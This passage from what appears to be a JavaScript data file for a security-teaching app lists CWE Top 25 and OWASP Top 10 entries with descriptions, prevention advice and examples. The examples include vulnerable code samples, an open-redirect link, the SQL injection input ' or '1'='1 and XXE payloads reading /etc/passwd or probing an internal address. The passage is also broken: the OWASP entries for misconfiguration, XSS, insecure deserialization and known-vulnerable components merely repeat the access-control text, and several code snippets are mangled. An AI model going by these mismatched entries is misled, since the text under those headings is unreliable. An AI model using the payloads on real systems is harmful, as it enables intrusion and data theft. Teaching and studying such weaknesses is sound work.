        This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long,
         it may result in many types of out-of-bounds problems (CWE-119).`,

  },
  {
    title: '[21] CWE-307: Improper Restriction of Excessive Authentication Attempts',
    subtitle: `The software does not implement sufficient measures to prevent multiple failed authentication attempts within in a short time frame, making it more susceptible to brute force attacks.
        `,
    isVulnerablePara: `An often-used phrase is "If at first you don't succeed, try, try again." Attackers may try to break into your account by writing programs that repeatedly guess different passwords. Without some kind of protection against brute force techniques, the attack will eventually succeed. You don't have to be advanced to be persistent.

        `,
    prevention: `Architecture and Design
        Common protection mechanisms include:
        Disconnecting the user after a small number of failed attempts

        Implementing a timeout

        Locking out a targeted account

        Requiring a computational task on the user's part.

        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator.`,

    example: `The following code, extracted from a servlet's doPost() method, performs an authentication lookup every time the servlet is invoked.

        (bad code)
        Example Language: Java
        String username = request.getParameter("username");
        String password = request.getParameter("password");

        int authResult = authenticateUser(username, password);
        However, the software makes no attempt to restrict excessive authentication attempts.`,

  },
  {
    title: '[22] CWE-601: URL Redirection to Untrusted Site (Open Redirect)    ',
    subtitle: `A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.
        `,
    isVulnerablePara: `While much of the power of the World Wide Web is in sharing and following links between web sites, typically there is an assumption that a user should be able to click on a link or perform some other action before being sent to a different web site. Many web applications have implemented redirect features that allow attackers to specify an arbitrary URL to link to, and the web client does this automatically. This may be another of those features that are "just the way the web works," but if left unchecked, it could be useful to attackers in a couple important ways. First, the victim could be autoamtically redirected to a malicious site that tries to attack the victim through the web browser. Alternately, a phishing attack could be conducted, which tricks victims into visiting malicious sites that are posing as legitimate sites. Either way, an uncontrolled redirect will send your users someplace that they don't want to go.

        `,
    prevention: `Implementation
        Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
        When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

        Use a whitelist of approved URLs or domains to be used for redirection.

        Architecture and Design
        Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving your site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.
        Architecture and Design
        When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
        For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap provide this capability.

        Architecture and Design, Implementation
        Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
        Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.

        Operation
        Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
        Effectiveness: Moderate

        Notes: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests.
        Finally, some manual effort may be required for customization.`,

    example: `The following code obtains a URL from the query string and then redirects the user to that URL.

        (bad code)
        Example Language: PHP
        $redirect_url = $_GET['url'];
        header("Location: " . $redirect_url);
        The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:

        (attack code)

        http://example.com/example.php?url=http://malicious.example.com
        The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place`,

  },
  {
    title: '[23] CWE-134: Uncontrolled Format String',
    subtitle: `The software uses a function that accepts a format string as an argument, but the format string originates from an external source.
        `,
    isVulnerablePara: `The mantra is that successful relationships depend on communicating clearly, and this applies to software, too. Format strings are often used to send or receive well-formed data. By controlling a format string, the attacker can control the input or output in unexpected ways - sometimes, even, to execute code.

        `,
    prevention: `Requirements
        Choose a language that is not subject to this flaw.
        Implementation
        Ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings.

        Build: Heed the warnings of compilers and linkers, since they may alert you to improper usage.`,

    example: `Certain implementations make more advanced attacks even easier by providing format directives that control the location in memory to read from or write to. An example of these directives is shown in the following code, written for glibc:

        (bad code)
        Example Language: C
        printf("%d %d %1$d %1$d\n", 5, 9);
        This code produces the following output: 5 9 5 5 It is also possible to use half-writes (%hn) to accurately control arbitrary DWORDS in memory, which greatly reduces the complexity needed to execute an attack that would otherwise require four staggered writes, such as the one mentioned in
        the first example.`,

  },
  {
    title: '[24] CWE-190: Integer Overflow or Wraparound',
    subtitle: `The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.
        `,
    isVulnerablePara: `In the real world, 255+1=256. But to a computer program, sometimes 255+1=0, or 0-1=65535, or maybe 40,000+40,000=14464. You don't have to be a math whiz to smell something fishy. Actually, this kind of behavior has been going on for decades, and there's a perfectly rational and incredibly boring explanation. Ultimately, it's buried deep in the DNA of computers, who can't count to infinity even if it sometimes feels like they take that long to complete an important task. When programmers forget that computers don't do math like people, bad things ensue - anywhere from crashes, faulty price calculations, infinite loops, and execution of code.

        `,
    prevention: `Requirements
        Ensure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.
        Requirements
        Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        If possible, choose a language or compiler that performs automatic bounds checking.

        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Use libraries or frameworks that make it easier to handle numbers without unexpected consequences.

        Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).

        Implementation
        Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.
        Use unsigned integers where possible. This makes it easier to perform sanity checks for integer overflows.
         If you must use signed integers, make sure that your range check includes minimum values as well as maximum values.`,

    example: `The following code excerpt from OpenSSH 3.3 demonstrates a classic case of integer overflow:

        (bad code)
        Example Language: C
        nresp = packet_get_int();
        if (nresp > 0) {
        response = xmalloc(nresp*sizeof(char*));
        for (i = 0; i < nresp; i++) response[i] = packet_get_string(NULL);
        }
        If nresp has the value 1073741824 and sizeof(char*) has its typical value of 4, then the result of the operation nresp*sizeof(char*) overflows, and the argument to xmalloc() will be 0. Most malloc() implementations will happily allocate a 0-byte buffer, causing the subsequent loop iterations
        to overflow the heap buffer response.`,

  },
  {
    title: '[25] CWE-759: Use of a One-Way Hash without a Salt ',
    subtitle: `The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input.
        `,
    isVulnerablePara: `Salt might not be good for your diet, but it can be good for your password security. Instead of storing passwords in plain text, a common practice is to apply a one-way hash, which effectively randomizes the output and can make it more difficult if (or when?) attackers gain access to your password database. If you don't add a little salt to your hash, then the health of your application is in danger.


        `,
    prevention: `Architecture and Design
        Generate a random salt each time you process a new password. Add the salt to the plaintext password before hashing it. When you store the hash, also store the salt. Do not use the same salt for every password that you process (CWE-760).
        Architecture and Design
        Use one-way hashing techniques that allow you to configure a large number of rounds, such as bcrypt. This may increase the expense when processing incoming authentication requests, but if the hashed passwords are ever stolen, it significantly increases the effort for conducting a brute force attack, including rainbow tables. With the ability to configure the number of rounds, you can increase the number of rounds whenever CPU speeds or attack techniques become more efficient.
        Implementation, Architecture and Design
        When you use industry-approved techniques, you need to use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.`,

    example: `In both of these examples, a user is logged in if their given password matches a stored password:

        (bad code)
        Example Language: C
        unsigned char *check_passwd(char *plaintext) {
        ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );
        //Login if hash matches stored hash
        if (equal(ctext, secret_password())) {
        login_user();
        }
        }
        (bad code)
        Example Language: Java
        String plainText = new String(plainTextIn);
        MessageDigest encer = MessageDigest.getInstance("SHA");
        encer.update(plainTextIn);
        byte[] digest = password.digest();
        //Login if hash matches stored hash
        if (equal(digest,secret_password())) {
        login_user();
        }
        This code does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password. Note this code also exhibits CWE-328 (Reversible One-Way Hash).`,

  },


  ];

  data = [{
    title: 'A1 : Injection',
    subtitle: `Injection flaws
    are very prevalent, particularly in
    legacy code. Injection vulnerabilities are often found
    in SQL, LDAP, XPath, or NoSQL queries, OS
    commands, XML parsers, SMTP headers,
    expression languages, and ORM queries.
    Injection flaws are easy to discover when examining
    code. Scanners and fuzzers can help attackers find
    injection flaws.`,
    isVulnerablePara: `An application is vulnerable to attack when:
    • User supplied data is not validated, filtered, or sanitized by the
    application.
    • Dynamic queries or non parameterized calls without context
    aware escaping are used directly in the interpreter.
    • Hostile data is used within object relational mapping (ORM)
    search parameters to extract additional, sensitive records.
    • Hostile data is directly used or concatenated, such that the
    SQL or command contains both structure and hostile data in
    dynamic queries, commands, or stored procedures.
    Some of the more common injections are SQL, NoSQL, OS
    command, Object Relational Mapping (ORM), LDAP, and
    Expression Language (EL) or Object Graph Navigation Library
    (OGNL) injection. The concept is identical among all interpreters.
    Source code review is the best method of detecting if
    applications are vulnerable to injections, closely followed by
    thorough automated testing of all parameters, headers, URL,
    cookies, JSON, SOAP, and XML data inputs. Organizations can
    include static source ( SAST ) and dynamic application test
    DAST ) tools into the CI/CD pipeline to identify newly introduced
    injection flaws prior to production deployment.`,
    prevention: `Preventing injection requires keeping data separate from
    commands and queries.
    •
    The preferred option is to use a safe API, which avoids the use
    of the interpreter entirely or provides a parameterized interface,
    or migrate to use Object Relational Mapping Tools (ORMs).
    Note : Even when parameterized, stored procedures can still
    introduce SQL injection if PL/SQL or T SQL concatenates
    queries and data, or executes hostile data with EXECUTE
    IMMEDIATE or exec().
    •
    Use positive or "whitelist" server side input validation. This is
    not a complete defense as many applications require special
    characters, such as text areas or APIs for mobile applications.
    •
    For any residual dynamic queries, escape special characters
    using the specific escape syntax for that interpreter.
    Note : SQL structure such as table names, column names, and
    so on cannot be escaped, and thus user supplied structure
    names are dangerous. This is a common issue in report writing
    software.
    •
    Use LIMIT and other SQL controls within queries to prevent
    mass disclosure of records in case of SQL injection.`,

    example: `Scenario #1
    : An application uses untrusted data in the
    construction of the following vulnerable SQL call:
    String query = "SELECT * FROM accounts WHERE
    custID ==''" + request.getParameter ("id") +
    Scenario #2
    : Similarly, an application’s blind trust in frameworks
    may result in queries that are still vulnerable, (e.g. Hibernate
    Query Language (HQL)):
    Query
    HQLQuery = session.createQuery ("FROM accounts
    WHERE custID ==''" + request.getParameter ("id") +
    In both cases, the attacker modifies the ‘id’ parameter value in
    their browser to send: ' or '1'='1 . For example:
    http://example.com/app/accountView?id=
    or 1 1
    This changes the meaning of both queries to return all the
    records from the accounts table. More dangerous attacks could
    modify or delete data, or even invoke stored procedures.`,

  },
  {
    title: 'A2 : Broken Authentication',
    subtitle: `Attackers have access to hundreds of
  millions of valid username and
  password combinations for credential
  stuffing, default administrative
  account lists, automated brute force,
  and dictionary attack tools. Session
  management attacks are well
  understood, particularly in relation to
  unexpired session tokens.`,
    isVulnerablePara: `Confirmation of the user's identity, authentication, and session
  management are critical to protect against authentication related
  attacks.
  There may be authentication weaknesses if the application:
  •
  Permits automated attacks such as credential stuffing , where
  the attacker has a list of valid usernames and passwords.
  •
  Permits brute force or other automated attacks.
  •
  Permits default, weak, or well known passwords, such as
  "Password1" or "admin/
  •
  Uses weak or ineffective credential recovery and forgot
  password processes, such as "knowledge based answers",
  which cannot be made safe.
  •
  Uses plain text, encrypted, or weakly hashed passwords (see
  A3:2017 Sensitive Data Exposure
  •
  Has missing or ineffective multi factor authentication.
  •
  Exposes Session IDs in the URL (e.g., URL rewriting).
  •
  Does not rotate Session IDs after successful login.
  •
  Does not properly invalidate Session IDs. User sessions or
  authentication tokens (particularly single sign on (SSO) tokens)
  aren’t properly invalidated during logout or a period of inactivity.`,
    prevention: `•
  Where possible, implement multi factor authentication to
  prevent automated, credential stuffing, brute force, and stolen
  credential re use attacks.
  •
  Do not ship or deploy with any default credentials, particularly
  for admin users.
  •
  Implement weak password checks, such as testing new or
  changed passwords against a list of the top 10000 worst
  passwords
  •
  Align password length, complexity and rotation policies with
  NIST 800 63 B's guidelines in section 5.1.1 for Memorized
  Secrets or other modern, evidence based password policies.
  •
  Ensure registration, credential recovery, and API pathways are
  hardened against account enumeration attacks by using the
  same messages for all outcomes.
  •
  Limit or increasingly delay failed login attempts. Log all failures
  and alert administrators when credential stuffing, brute force, or
  other attacks are detected.
  •
  Use a server side, secure, built in session manager that
  generates a new random session ID with high entropy after
  login. Session IDs should not be in the URL, be securely stored
  and invalidated after logout, idle, and absolute timeouts`,

    example: `Scenario #1
  : Credential stuffing , the use of lists of known
  passwords , is a common attack. If an application does not
  implement automated threat or credential stuffing protections, the
  application can be used as a password oracle to determine if the
  credentials are valid.
  Scenario #2
  : Most authentication attacks occur due to the
  continued use of passwords as a sole factor. Once considered
  best practices, password rotation and complexity requirements
  are viewed as encouraging users to use, and reuse, weak
  passwords. Organizations are recommended to stop these
  practices per NIST 800 63 and use multi factor authentication.
  Scenario #3
  : Application session timeouts aren’t set properly. A
  user uses a public computer to access an application. Instead of
  selecting “logout” the user simply closes the browser tab and
  walks away. An attacker uses the same browser an hour later,
  and the user is still authenticated.`,

  },
  {
    title: 'A3 : Sensitive Data Exposure',
    subtitle: `Rather than directly attacking crypto,
  attackers steal keys, execute man in
  the middle attacks, or steal clear text
  data off the server, while in transit, or
  from the user’s client, e.g. browser. A
  manual attack is generally required.
  Previously retrieved password
  databases could be brute forced by
  Graphics Processing Units (GPUs).`,
    isVulnerablePara: `The first thing is to determine the protection needs of data in
  transit and at rest. For example, passwords, credit card numbers,
  health records, personal information and business secrets
  require extra protection, particularly if that data falls under
  privacy laws, e.g. EU's General Data Protection Regulation
  (GDPR), or regulations, e.g. financial data protection such as
  PCI Data Security Standard (PCI DSS). For all such data:
  •
  Is any data transmitted in clear text? This concerns protocols
  such as HTTP, SMTP, and FTP. External internet traffic is
  especially dangerous. Verify all internal traffic e.g. between
  load balancers, web servers, or back end systems.
  •
  Is sensitive data stored in clear text, including backups?
  •
  Are any old or weak cryptographic algorithms used either by
  default or in older code?
  •
  Are default crypto keys in use, weak crypto keys generated or
  re used, or is proper key management or rotation missing?
  •
  Is encryption not enforced, e.g. are any user agent (browser)
  security directives or headers missing?
  •
  Does the user agent (e.g. app, mail client) not verify if the
  received server certificate is valid?
  See ASVS
  Crypto (V7) V7), Data Prot (V9) and SSL/TLS (V10)`,
    prevention: `Do the following, at a minimum, and consult the references:
  •
  Classify data processed, stored, or transmitted by an
  application. Identify which data is sensitive according to privacy
  laws, regulatory requirements, or business needs.
  •
  Apply controls as per the classification.
  •
  Don’t store sensitive data unnecessarily. Discard it as soon as
  possible or use PCI DSS compliant tokenization or even
  truncation. Data that is not retained cannot be stolen.
  •
  Make sure to encrypt all sensitive data at rest.
  •
  Ensure up to date and strong standard algorithms, protocols,
  and keys are in place; use proper key management.
  •
  Encrypt all data in transit with secure protocols such as TLS
  with perfect forward secrecy (PFS) ciphers, cipher prioritization
  by the server, and secure parameters. Enforce encryption
  using directives like HTTP Strict Transport Security ( HSTS
  •
  Disable caching for responses that contain sensitive data.
  •
  Store passwords using strong adaptive and salted hashing
  functions with a work factor (delay factor), such as Argon2 ,
  scrypt , bcrypt , or PBKDF2
  •
  Verify independently the effectiveness of configuration and
  settings.`,

    example: `Scenario #1
  : An application encrypts credit card numbers in a
  database using automatic database encryption. However, this
  data is automatically decrypted when retrieved, allowing an SQL
  injection flaw to retrieve credit card numbers in clear text.
  Scenario #2
  : A site doesn't use or enforce TLS for all pages or
  supports weak encryption. An attacker monitors network traffic
  (e.g. at an insecure wireless network), downgrades connections
  from HTTPS to HTTP, intercepts requests, and steals the user's
  session cookie. The attacker then replays this cookie and hijacks
  the user's (authenticated) session, accessing or modifying the
  user's private data. Instead of the above they could alter all
  transported data, e.g. the recipient of a money transfer.
  Scenario #3
  : The password database uses unsalted or simple
  hashes to store everyone's passwords. A file upload flaw allows
  an attacker to retrieve the password database. All the unsalted
  hashes can be exposed with a rainbow table of pre calculated
  hashes. Hashes generated by simple or fast hash functions may
  be cracked by GPUs, even if they were salted.`,

  },
  {
    title: 'A4 : XML External Entities (XXE)',
    subtitle: `Attackers can exploit vulnerable XML
  processors if they can upload XML or
  include hostile content in an XML
  document, exploiting vulnerable code,
  dependencies or integrations .`,
    isVulnerablePara: `Applications and in particular XML
  based web services or
  downstream integrations might be vulnerable to attack if:
  •
  The application accepts XML directly or XML uploads,
  especially from untrusted sources, or inserts untrusted data into
  XML documents, which is then parsed by an XML processor.
  •
  Any of the XML processors in the application or SOAP based
  web services has document type definitions (DTDs) enabled.
  As the exact mechanism for disabling DTD processing varies
  by processor, it is good practice to consult a reference such as
  the OWASP Cheat Sheet 'XXE Prevention’ Prevention’.
  •
  If your application uses SAML for identity processing within
  federated security or single sign on (SSO) purposes. SAML
  uses XML for identity assertions, and may be vulnerable.
  •
  If the application uses SOAP prior to version 1.2, it is likely
  susceptible to XXE attacks if XML entities are being passed to
  the SOAP framework.
  •
  Being vulnerable to XXE attacks likely means that the
  application is vulnerable to denial of service attacks including
  the Billion Laughs attack.`,
    prevention: `Developer training is essential to identify and mitigate XXE.
  Besides that, preventing XXE requires:
  •
  Whenever possible, use less complex data formats such as
  JSON , and avoiding serialization of sensitive data.
  •
  Patch or upgrade all XML processors and libraries in use by
  the application or on the underlying operating system . Use
  dependency checkers. Update SOAP to SOAP 1.2 or higher.
  •
  Disable XML external entity and DTD processing in all XML
  parsers in the application, as per the OWASP Cheat Sheet
  'XXE Prevention'.
  •
  Implement positive ("whitelisting") server side input validation,
  filtering, or sanitization to prevent hostile data within XML
  documents, headers, or nodes.
  •
  Verify that XML or XSL file upload functionality validates
  incoming XML using XSD validation or similar.
  •
  SAST tools can help detect XXE in source code, although
  manual code review is the best alternative in large, complex
  applications with many integrations.
  If these controls are not possible, consider using virtual
  patching, API security gateways, or Web Application Firewalls
  (WAFs) to detect, monitor, and block XXE`,

    example: `Numerous public XXE issues have been discovered, including
  attacking embedded devices. XXE occurs in a lot of unexpected
  places, including deeply nested dependencies. The easiest way
  is to upload a malicious XML file, if accepted:
  Scenario #1
  : The attacker attempts to extract data from the
  server:
  <?xml version="1.0" encoding="ISO
  8859 1"?>
  <!DOCTYPE foo
  <!ELEMENT foo ANY
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  < xxe ;</
  Scenario #2
  : An attacker probes the server's private network by
  changing the above ENTITY line to:
  <!ENTITY
  xxe SYSTEM "https://192.168.1.1/private" >]>
  Scenario #3
  : An attacker attempts a denial of service attack by
  including a potentially endless file:
  <!ENTITY
  xxe SYSTEM "file:///dev/random" >]>`,

  },
  {
    title: 'A5 : Broken Access Control',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },
  {
    title: 'A6 : Security Misconfiguration',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },
  {
    title: 'A7 : Cross-Site Scripting (XSS)',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },
  {
    title: 'A8 : Insecure Deserialization',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },
  {
    title: 'A9 : Using Components with Known Vulnerabilities',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
